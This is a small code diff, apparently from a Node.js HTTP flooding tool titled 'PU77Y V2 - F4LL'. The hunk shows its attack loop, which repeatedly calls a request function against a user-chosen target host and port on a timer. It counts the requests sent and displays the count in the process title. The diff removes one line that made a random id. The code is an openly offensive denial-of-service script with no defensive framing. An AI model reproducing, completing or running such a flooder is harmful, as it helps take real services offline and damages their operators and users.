@@ -17,7 +17,6 @@ console.log(`                    |-------------------------------------------|`)
 
 
     let inter = setInterval(()=>{
-	let att = makeid(4)
 	pu77y('http://'+target+':'+port, rek, 1)
 	sended++
 	process.title = "PU77Y V2 - F4LL [Requests : "+sended+"]"
